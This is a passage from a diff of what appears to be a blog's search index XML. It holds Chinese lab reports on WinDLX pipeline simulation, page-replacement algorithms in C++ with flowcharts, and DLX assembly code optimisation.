+<h3 id="考察增加forward部件对性能的影响">考察增加 forward 部件对性能的影响</h3>
+<div class="tabs" id="results-2"><ul class="nav-tabs"><li class="tab"><a href="#results-2-1">不启用 forward 组件</a></li><li class="tab active"><a href="#results-2-2">使用 forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane" id="results-2-1"><p><img data-src="image_qREd2veXyT.png" alt=""></p></div><div class="tab-pane active" id="results-2-2"><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_aJF5rKvDFD.png" alt=""></div><div class="group-picture-column"><img data-src="image_5MH0T4ijzq.png" alt=""></div></div></div></div></div></div>
+<p>由以上截图可以发现：</p>
+<ul>
+<li>增加 forward 组件后所执行总的时钟周期相应有所减少</li>
+<li>增加 forward 组件使得 Stall 的总数有所下降，RAW 的总时钟周期从 29.09% 下降到了 13.64%</li>
+</ul>
+<p>总之，使用 forward 部件后，数据相关减少，性能得到一定的改善</p>
+<h3 id="观察转移指令在转移成功和转移不成功时候的流水线开销">观察转移指令在转移成功和转移不成功时候的流水线开销</h3>
+<p>floating 设置为 2，4，forward 启动时条件转移结果如下图：</p>
+<p><img data-src="image_IBeOkazciZ.png" alt=""></p>
+<p>转移指令一共 6 条，成功转移 2 条，不成功转移 4 条。</p>
+<p>若转移不成功，对流水线执行无影响，流水线吞吐率和效率没有降低。若转移成功，则要废弃预先读入的指令，重新从转移成功处读取指令，每执行一条条件转移指令，一条 x 段流水线就有 x-2 个流水线被浪费掉，执行效率降低，性能有一定损失。</p>
+<h2 id="实验总结">实验总结</h2>
+<p>流水线技术可以提高计算机执行效率，但也有很多不足，当发生一些相关的时候执行就需要延迟，这会影响到流水线的吞吐率，而要保证高效，就需要对代码进行优化处理，这是需要个人的努力的。</p>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>计算机组成原理</category>
+      </categories>
+      <tags>
+        <tag>WinDLX</tag>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件系统实验</title>
     <url>/2019/11/11/experiments/oskernel/file-system/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
@@ -2602,7 +2869,8 @@ MFS 文件系统以后，就可以像以前使用 NFS 一样共享这个虚拟�
 <li>将用到的 <code>pagecontrol</code> 置入使用队列（这里的队列当然是一种先进先出的数据结构），返回 2；</li>
 <li>显示命中率，算法完成。</li>
 </ol>
-<pre class="mermaid">graph TD
+<pre><code class="mermaid">
+graph TD
 A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
 B --&gt; |N|D(["显示命中率，算法完成"])
 C --&gt; E{"该页是否在内存中"} E --&gt; |Y|B E --&gt; |N|F["diseffect++"]
@@ -2610,6 +2878,7 @@ F --&gt; G{Pagecontrol是否占满} G --&gt; |Y|H["将最先进入的单元清�
 G --&gt; |N|I["建立page和pagecontrol的关系"]
 H --&gt; I I --&gt; J["用到的Pagecontrol置入使用队列"]
 J --&gt; B
+</code>
 </pre>
 <figure class="highlight c++"><figcaption><span>FIFO 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::FIFO</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>{</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	CPageControl *p;</span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">	_pBusypf_head=_pBusypf_tail=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++) {</span><br><span class="line">	<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">		_nDiseffect+=<span class="number">1</span>;</span><br><span class="line">    	<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>){  <span class="comment">// 无空闲页面</span></span><br><span class="line">	  		p=_pBusypf_head-&gt;m_pNext;</span><br><span class="line">	  		_vDiscPages[_pBusypf_head-&gt;m_nPageNumber].m_nPageFaceNumber=INVALID;</span><br><span class="line">	  		_pFreepf_head=_pBusypf_head;</span><br><span class="line">	  		_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">	  		_pBusypf_head=p;</span><br><span class="line">		}</span><br><span class="line">		p=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">		_pFreepf_head-&gt;m_nPageNumber=_vPage[i];</span><br><span class="line">		_vDiscPages[_vPage[i]].m_nPageFaceNumber =_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">		<span class="keyword">if</span>(_pBusypf_tail==<span class="literal">NULL</span>)</span><br><span class="line">			_pBusypf_head=_pBusypf_tail=_pFreepf_head;</span><br><span class="line">		<span class="keyword">else</span>{</span><br><span class="line">	  		_pBusypf_tail-&gt;m_pNext=_pFreepf_head;</span><br><span class="line">	  		_pBusypf_tail=_pFreepf_head;</span><br><span class="line">		}</span><br><span class="line"> 		_pFreepf_head=p;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"FIFO: "</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <div class="note success"><p>易于实现</p>
@@ -2623,7 +2892,8 @@ J --&gt; B
 <li>在需要处理的 <code>page[]</code> 与 4 中得到的 <code>pagecontrol[]</code> 建立关系，同时让对应的 <code>page[]</code> 单元保存 “最新使用” 的信息，返回 2；</li>
 <li>如果序列处理完成，就输出命中率，算法结束。</li>
 </ol>
-<pre class="mermaid">graph TD
+<pre><code class="mermaid">
+graph TD
  A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
 B --&gt; |N|D(["显示命中率，算法完成"])
 C --&gt; E{"该页是否在内存中"} E --&gt; |Y|E_1["修改页面属性，使它保留“最近使用”的信息"]
@@ -2632,6 +2902,7 @@ F --&gt; G{是否有空闲页面} G --&gt; |Y|H["返回该页面指针"]
 G --&gt; |N|I["在内存页面中找出最长时间没有使用到的页面,将其清理"]
 I --&gt; H H --&gt; J[内存页面和待处理的进程页面建立关系,对应单元保存最新使用信息]
 J --&gt; B 
+</code>
 </pre>
 <figure class="highlight c++"><figcaption><span>LRU 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::LRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>{</span><br><span class="line">	<span class="type">int</span> i,j,nMin,minj,<span class="built_in">nPresentTime</span>(<span class="number">0</span>);</span><br><span class="line"> 	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++){</span><br><span class="line">  		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">  			_nDiseffect++;</span><br><span class="line">  			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>){</span><br><span class="line">      			nMin=<span class="number">32767</span>;</span><br><span class="line">      			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">                <span class="comment">// 得到最近最少使用的页面的页号</span></span><br><span class="line">                <span class="comment">// 循环结束后,iMin表示最近最少使用页面的访问次数;minj表示需要换出的页号</span></span><br><span class="line">					<span class="keyword">if</span>(nMin&gt;_vDiscPages[j].m_nTime&amp;&amp;_vDiscPages[j].m_nPageFaceNumber!=INVALID){</span><br><span class="line">						nMin=_vDiscPages[j].m_nTime;</span><br><span class="line">	    				minj=j;</span><br><span class="line">					}</span><br><span class="line"></span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[minj].m_nPageFaceNumber];</span><br><span class="line">				_vDiscPages[minj].m_nPageFaceNumber=INVALID;</span><br><span class="line">				_vDiscPages[minj].m_nTime=<span class="number">-1</span>;</span><br><span class="line">				_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">   			}</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">			_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">		nPresentTime++;</span><br><span class="line">	}</span><br><span class="line">  	cout&lt;&lt;<span class="string">"LRU: "</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <div class="note success"><p>页面利用率有显著提升</p>
@@ -2647,7 +2918,8 @@ J --&gt; B
 <li>返回 2。</li>
 <li>如果 CPU 所有处理工作完成，就返回命中率的结果，算法结束。</li>
 </ol>
-<pre class="mermaid">graph TD
+<pre><code class="mermaid">
+graph TD
  A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
 B --&gt; |N|D(["显示命中率，算法完成"])
 C --&gt; E{"该页是否在内存中"} E --&gt; B E --&gt; |N|F["diseffect++"]
@@ -2656,6 +2928,7 @@ G --&gt; |N|I["在所有没有被访问且位于内存中的页面中按任意�
 I --&gt; H H --&gt; J[内存页面和待处理的进程页面建立关系,标注页面被访问]
 J --&gt; K{"CPU已经处理了CLEAR_PERIOD个页面"} K --&gt; |N|B K --&gt; |Y|B'["将所有页面设置为'未访问'"]
 B'--&gt; B 
+</code>
 </pre>
 <figure class="highlight c++"><figcaption><span>NRU 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::NRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span>   </span>{</span><br><span class="line">	<span class="type">int</span> i,j,nDiscPage,nOld_DiscPage;</span><br><span class="line"> 	<span class="type">bool</span> bCont_flag;</span><br><span class="line">  	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">  	nDiscPage=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)     {</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)  	{</span><br><span class="line">  			_nDiseffect++;</span><br><span class="line">  			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	    {</span><br><span class="line">      			bCont_flag=<span class="literal">true</span>;</span><br><span class="line">      			nOld_DiscPage=nDiscPage;</span><br><span class="line">      			<span class="keyword">while</span>(bCont_flag)		{</span><br><span class="line">					<span class="keyword">if</span>(_vDiscPages[nDiscPage].m_nCounter==<span class="number">0</span>&amp;&amp;_vDiscPages[nDiscPage].m_nPageFaceNumber!=INVALID)</span><br><span class="line">	    					bCont_flag=<span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">else</span> {</span><br><span class="line">  						nDiscPage++;</span><br><span class="line">  						<span class="keyword">if</span>(nDiscPage==TOTAL_VP) nDiscPage=<span class="number">0</span>;</span><br><span class="line">  						<span class="keyword">if</span>(nDiscPage==nOld_DiscPage)</span><br><span class="line">  						<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">	  						_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">	   				}</span><br><span class="line">				}</span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[nDiscPage].m_nPageFaceNumber];</span><br><span class="line">				_vDiscPages[nDiscPage].m_nPageFaceNumber=INVALID;</span><br><span class="line">      			_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">    			}</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">  			_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">  			_vDiscPages[_vPage[i]].m_nCounter=<span class="number">1</span>;</span><br><span class="line">    		<span class="keyword">if</span>(i%CLEAR_PERIOD==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">					_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"NRU:"</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <div class="note success"><p>易于理解，容易实现。</p>
@@ -2670,7 +2943,8 @@ B'--&gt; B
 </ol>
 <div class="note info"><p>从以上算法描述中，可以看出，OPT 是一种理想化的算法，因为操作系统中页面处理顺序是不一定的，所以页面将在哪一步被处理是不可预测的。但是，可以以此为标准来评价其他页面置换算法。</p>
 </div>
-<pre class="mermaid">graph TD
+<pre><code class="mermaid">
+graph TD
 A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
 B --&gt; |N|D(["显示命中率，算法完成"])
 C --&gt; E{"该页是否在内存中"} E --&gt; |Y|B E --&gt; |N|F["diseffect++"]
@@ -2680,6 +2954,7 @@ I --&gt; J{"存在位于内存中的页面，而以后CPU不再处理"} J --&gt;
 J --&gt; |N|L[找出CPU最晚处理到的页面]
 L --&gt; K K --&gt; H H --&gt; M[内存页面和待处理的进程页面建立关系]
 M --&gt; B
+</code>
 </pre>
 <figure class="highlight c++"><figcaption><span>OPT 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::OPT</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"> 	<span class="type">int</span> i,j,max,maxpage,nDistance,vDistance[TOTAL_VP];</span><br><span class="line">  	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">  	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)    {</span><br><span class="line">    		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">			_nDiseffect++;</span><br><span class="line">	  		<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	    {</span><br><span class="line">	     			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">           				<span class="keyword">if</span>(_vDiscPages[j].m_nPageFaceNumber!=INVALID)</span><br><span class="line">						vDistance[j]=<span class="number">32767</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">		      			vDistance[j]=<span class="number">0</span>;</span><br><span class="line">				nDistance=<span class="number">1</span>;</span><br><span class="line">  				<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;TOTAL_INSTRUCTION;j++)		{</span><br><span class="line">      				<span class="keyword">if</span>((_vDiscPages[_vPage[j]].m_nPageFaceNumber!=INVALID)&amp;&amp;(vDistance[_vPage[j]]==<span class="number">32767</span>))</span><br><span class="line">        				vDistance[_vPage[j]]=nDistance;</span><br><span class="line">     				nDistance++;</span><br><span class="line">				}</span><br><span class="line">    			max=<span class="number">-1</span>;</span><br><span class="line">    			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">				<span class="keyword">if</span>(max&lt;vDistance[j]){</span><br><span class="line">    					max=vDistance[j];</span><br><span class="line">    					maxpage=j;</span><br><span class="line">				}</span><br><span class="line">			_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[maxpage].m_nPageFaceNumber];</span><br><span class="line">    			_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">    			_vDiscPages[maxpage].m_nPageFaceNumber=INVALID;</span><br><span class="line">  			}</span><br><span class="line">		_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">	  	_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">   	}</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"OPT:"</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></div></div>
 <h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
@@ -3162,273 +3437,6 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
         <tag>OS</tag>
         <tag>Red Hat Linux</tag>
         <tag>gcc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WinDLX 模拟器安装与使用</title>
-    <url>/2022/10/15/experiments/jizu/installing-and-using-windlx/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>建立实验环境，了解 WINDLX 模拟器的结构及使用。</p>
-<h2 id="实验原理">实验原理</h2>
-<p>WinDLX 软件包中带有说明文件，供安装程序时候使用。</p>
-<h2 id="实验步骤">实验步骤</h2>
-<h3 id="安装WinDLX">安装 WinDLX</h3>
-<p>由于 WinDLX 是一个非常古老的模拟软件，但是我们现在多用 Win10 和 Win11 系统，所以需要使用虚拟机运行该软件。Win11 可以使用 Hyper-V 虚拟化运行方案，其界面如下所示：</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_qFbv2Qa_D3.png" class="" title="Hyper-V管理器主界面">
-<p>具体启用支持的方法在这里不多说了，之后可以像 VMware 虚拟机一样，添加一个 Windows XP 的系统镜像，并等待虚拟机上操作系统安装的流程走完，即可开始使用。</p>
-<div class="note info"><p>Hyper-V 无法像 VMware 虚拟机那样直接将文件拖入窗口来复制，但可以先将需要用到的文件制作成 vhd 虚拟硬盘，然后再加载硬盘。</p>
-</div>
-<p>所给定的 WinDLX 文件夹如下所示，我们可以直接双击 WinDLX.exe 来启动软件。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_sPpeg0VgHi.png" class="">
-<h3 id="熟悉使用界面">熟悉使用界面</h3>
-<p>启动软件过后，可以看到一个窗口和六个子窗口，子窗口的名称分别为 Clock Cycle Diagram、Statistics、Breakpoints、Register、Code 和 Pipeline，双击这些子窗口或单击其上方的还原键即可看到子窗口的内容。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_KxjgEY9_X1.png" class="">
-<p>要初始化模拟器，可以点击 File 菜单中的 Reset all 菜单项，弹出一个 “Reset DLX” 对话框。然后点击窗口中的 “确认” 按钮即可。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_YEchSWiXz5.png" class="">
-<p>要载入文件或代码，需要点击 File 菜单的 Load Code or Data，在以下对话框中，依次选择 Fact.s 和 Input.s 文件，完成后单击 Load，将它们加载到主存中。</p>
-<div class="note warning"><p>注意：要先选择 fact.s 再选择 input.s 文件。程序在内存中出现的顺序很重要。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_XfmJxGPgJb.png" class="">
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_jU6xYnVOwT.png" class="" title="现在，单击Load按钮将它们加载到主存中"></div>
-<p>成功加载文件后，会提示你重置 DLX，单击 “是”。这样，文件就已经装入到存储器中了。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_zGYcGmsMFa.png" class="">
-<p>结合装载的文件，来介绍一下六大窗口的主要功能</p>
-<h4 id="Code-代码窗口">Code 代码窗口</h4>
-<p>在 Code 窗口中，我们能够看到代表存储器内容的三栏信息，从左到右依次为：地址 (符号或数字)、命令的十六进制机器代码和汇编命令。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_N5Tfs32zDs.png" class="">
-<p>单击 WinDLX 窗口的 Execute（执行）按钮可以执行装入的程序，可以选择单步执行（Single Cycle，快捷键 F7）或多步执行（Multi Cycles，快捷键 F8）。当单步执行时，也有流水段颜色的区分（IF、ID、intEX、MEM 和 WB）</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_OAHMDNAJGN.png" class="">
-<p>如果需要多步执行，就在这个对话框中输入要执行的流水数目即可。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_1Zzwpmaorh.png" class="">
-<h4 id="Pipeline流水线窗口">Pipeline 流水线窗口</h4>
-<p>流水线窗口主要显示了 DLX 处理器的内部结构，窗口下标识了 DLX 处理器的五个流水段和浮点操作（加 / 减、乘和除）的单元。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_bphLLi5PTe.png" class="">
-<p>在运行指令时，将 Pipeline 窗口放大，即可看到当前与 Code 中所处的时刻相同的指令流水，可以清晰看到不同流水段执行的是哪条指令。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ar42V_rtMT.png" class="">
-<h4 id="Clock-Circle-Diagram时钟周期图窗口">Clock Circle Diagram 时钟周期图窗口</h4>
-<p>Clock Cycle Diagram 窗口主要显示了运行代码时流水线的时空图，时空图反映的是不同时隙内的运行情况。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_mC0USoVaqr.png" class="">
-<p>在非空转代码的时候，显示如下：</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_bYqORtx7CN.png" class="">
-<p>任意双击指令的一行，可以详细看到不同流水段的情况，如下图所示。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ijbidVFTvq.png" class="">
-<h4 id="Register寄存器窗口">Register 寄存器窗口</h4>
-<p>Register 窗口会显示各个寄存器中的内容。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_oSJhNz14hV.png" class="">
-<h4 id="Statistic统计数据窗口">Statistic 统计数据窗口</h4>
-<p>Statistics 窗口提供对运行程序中任何数据的分析，主要包括模拟器中硬件配置的情况。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ph76EvKYO5.png" class="">
-<p>这里包含：</p>
-<ol>
-<li>整体指令执行情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_RVWe28mDgc.png" class="">
-</li>
-<li>硬件配置情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_341IwOGYJ5.png" class="">
-</li>
-<li>暂停次数、百分比和原因分析<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_8KxD3jZ_MV.png" class="">
-</li>
-<li>分支次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_JHGpyQ6kXB.png" class="">
-</li>
-<li>Load/Store 指令执行情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_4o7Y5cy8hA.png" class="">
-</li>
-<li>浮点指令执行次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_di1vmW6RNZ.png" class="">
-</li>
-<li>trap 发生次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_A9oR1nMPWT.png" class="">
-</li>
-</ol>
-<h4 id="Breakpoints断点窗口">Breakpoints 断点窗口</h4>
-<p>该窗口主要用来观察代码运行的情况。使用前，需要打开 Breakpoints 窗口（首先需要激活 Breakpoints 小窗口才会出现 Breakpoints 菜单项）来设置 breakpoint，这个值代表了指令运行到流水线的哪个阶段就暂停运行。</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_5qA1KGdijo.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_sM6iUTJGxM.png" class=""></div><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_cgfKBRYSZU.png" class="" title="从菜单中选择Set后，出现Set Breakpoint窗口"></div></div></div>
-<p>如果选择了 ID 阶段，在 Code 窗口相应行会出现 BID，表示程序执行到取指令 IF 结束译码 ID 开始的时候，程序将中止。</p>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_XrK7jIlqPf.png" class="" title="此时，Breakpoints窗口的显示为地址、中止阶段和当前指令">
-<p>WinDLX 可以在多种配置下工作。可以改变流水线的结构和时间要求、存储器大小和其他几个控制模拟的参数。均在 Configuration 菜单中完成配置。</p>
-<h5 id="Floating-Point-Stages配置窗口">Floating Point Stages 配置窗口</h5>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_T_5pLEA9Z3.png" class="">
-<p>可以设置加法、乘法和触发的单元数目和延迟。</p>
-<h5 id="Memory-Size配置窗口">Memory Size 配置窗口</h5>
-<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image__EPQPVWZ6k.png" class="">
-<p>可以设置存储空间的大小。</p>
-<h5 id="其他配置窗口">其他配置窗口</h5>
-<p>Configuration 菜单中的还有其他三种配置，它们是：Symbolic addresses、Absolute Cycle Count 和 Enable Forwarding。点击相应菜单项后，在它的旁边将显示一个小钩。</p>
-<ul>
-<li>最重要的配置项为 Enable Forwarding，指的是启用定向技术，定向技术是指将某个计算结果从其产生的地方直接送到其它指令需要它的地方，可以减少数据冲突引起的停顿。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>计算机组成原理</category>
-      </categories>
-      <tags>
-        <tag>WinDLX</tag>
-        <tag>计算机组成原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码优化</title>
-    <url>/2022/10/24/experiments/jizu/optimize/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>学习简单编译优化方法，观察采用编译优化方法所带来的性能的提高。</p>
-<h2 id="实验原理">实验原理</h2>
-<p>采用静态调度方法重排指令序列，减少相关，优化程序。</p>
-<h2 id="实验步骤">实验步骤</h2>
-<h3 id="用静态调度算法手工优化代码">用静态调度算法手工优化代码</h3>
-<p>选择上一个实验的两双精度浮点一维向量的加法运算代码作为优化对象，优化后的代码如下所示：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">VecLen: .word 16</span><br><span class="line">Vector1: .double 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</span><br><span class="line">; vec1=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">Vector2: .double 2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32</span><br><span class="line">; vec2=[2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32]</span><br><span class="line">; 声明向量长度以及两个向量1、2</span><br><span class="line">Printf1: .asciiz "The result is\n"</span><br><span class="line">Printf2: .asciiz "%f\t"</span><br><span class="line"></span><br><span class="line">.align 2</span><br><span class="line"></span><br><span class="line">PrintfHead: .word Printf1</span><br><span class="line">PrintfValue: .word Printf2</span><br><span class="line">result: .space 8</span><br><span class="line">; 打印数据空间的申请</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">addi r14,r0,PrintfHead</span><br><span class="line">trap 5</span><br><span class="line">addi r2,r0,0</span><br><span class="line">lw r20,VecLen</span><br><span class="line">;addi r2,r0,0</span><br><span class="line"></span><br><span class="line">loop: ; 循环读入向量</span><br><span class="line">ld f0,Vector1(r2)</span><br><span class="line">ld f2,Vector2(r2)</span><br><span class="line">; 插入指令，避免f2的RAW</span><br><span class="line">addi r2,r2,8</span><br><span class="line">subi r20,r20,1</span><br><span class="line"></span><br><span class="line">addd f4,f0,f2</span><br><span class="line">; 主要的加法运算</span><br><span class="line">sd result,f4</span><br><span class="line">addi r14,r0,PrintfValue</span><br><span class="line">trap 5</span><br><span class="line">;addi r2,r2,8</span><br><span class="line">;subi r20,r20,1 提前到了前面</span><br><span class="line">bnez r20,loop</span><br><span class="line"></span><br><span class="line">trap 0</span><br><span class="line">; 